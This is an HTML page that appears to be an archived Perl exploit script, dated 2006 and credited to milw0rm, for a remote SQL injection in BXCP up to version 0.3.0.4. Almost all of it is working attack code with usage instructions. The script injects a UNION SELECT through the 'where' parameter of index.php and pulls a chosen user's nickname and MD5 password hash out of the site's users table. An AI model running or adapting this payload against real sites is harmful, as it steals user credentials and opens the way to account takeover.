<html><head><title>BXCP <=  0.3.0.4 (where) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

use IO::Socket;

print q{
-------------------------------------------------------------------------------------
BXCP exploit by x23 ~ curse-crew.de ~ geekbar.cx.la ~ geeknet.uttx.net
use: bxcp.pl [server] [dir] [id]
sample:
$ perl bxcp.pl bxcp.com / 1
~ connecting
~ exploiting
~ hash: *censored* ;D
-------------------------------------------------------------------------------------

};

$webpage =   $ARGV[0];
$directory = $ARGV[1];
$vic_id =    $ARGV[2];

if (!$vic_id) { die &quot;~ read how to use ;)\n&quot;; }

$get = &quot;http://&quot;.$webpage.$directory.&quot;index.php?mod=files&amp;action=view&amp;where=-1+UNION+&quot;;
$get .= &quot;SELECT+users_nick,0,users_pwd,0,0,0,0,0,0,0,0,0,0,0,0+FROM+{pre}_users+WHERE+users_id=&quot;;
$get .= $vic_id;

print &quot;~ connecting\n&quot;;
$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$webpage&quot;,
PeerPort=&gt;&quot;80&quot;) || die &quot;[+] Can't connect to Server\n&quot;;
print &quot;~ exploiting\n&quot;;
print $sock &quot;GET $get HTTP/1.1\n&quot;;
print $sock &quot;Host: $webpage\n&quot;;
print $sock &quot;Accept: */*\n&quot;;
print $sock &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4\n&quot;;
print $sock &quot;Connection: close\n\n&quot;;

while ($answer = &lt;$sock&gt;) {
  #print $answer;
  if ($answer =~ /([0-9a-f]{32})\n/) {
     print &quot;~ hash: $1\n&quot;;
     break;
  }
}

close($sock);

# milw0rm.com [2006-07-02]</pre></html>